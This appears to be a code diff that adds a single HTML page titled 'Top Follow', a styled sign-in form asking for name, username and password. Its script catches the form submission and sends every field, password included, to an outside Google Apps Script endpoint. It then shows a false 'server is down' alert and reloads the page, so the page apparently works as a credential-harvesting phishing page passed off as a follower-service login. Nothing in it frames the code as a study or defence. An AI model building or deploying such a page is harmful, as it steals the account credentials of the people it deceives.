@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Top Follow</title>
+    <link rel="icon" href="data:image/png;base64,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"
+    type="image/gif" sizes="16x16">
+    <link rel="stylesheet" href="stayle.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <section>
+
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+    
+       <form class="signin" id="submit-form" action="">
+          
+            <div class="content">
+              <h2>Sign In</h2>
+              <div class="form">
+                <div class="inputBox">
+                  <input type="text" required 
+                  class="input"
+                  type="text"
+                  placeholder=""
+                  name="name"
+                 />
+                  <i>name</i>
+                </div>
+                <div class="inputBox">
+                  <input type="text" required 
+                  class="input"
+                  type="text"
+                  placeholder=""
+                  name="Username"
+                 />
+                  <i>Username</i>
+                </div>
+                <div class="inputBox">
+                  <input type="password" required type="password"
+                  placeholder=""
+                  name="Password">
+                  <i>Password</i>
+                  
+                </div>
+                <div class="links">
+                  <a href="#">Forgot Password</a>
+                  <a href="#">Signup</a>
+                </div>
+    
+                <p><a href="https://www.blackbox.ai/chat/expert-html"></a>
+                <div class="inputBox">
+                 <input type="submit" value="Login" id="submit-button"></p>
+    
+                </div>
+              </div>
+            </div>
+          
+       </form>
+      </section>
+      <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycbyM9Zy8woVuqtlewoAvlgShBEj1jQH7mnR5C4rT7zNXC_y2tp0Sx6WEk__a2EbdyERAxA/exec",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                    alert("SERVER IS DOWN AFTER 24 HOURS ,is OK")
+                    window.location.reload()
+                    //window.location.href="https://google.com"
+                },
+                error:function (err){
+                    alert("Something Error")
+    
+                }
+            })
+        })
+    </script>
+</body>
+</html>
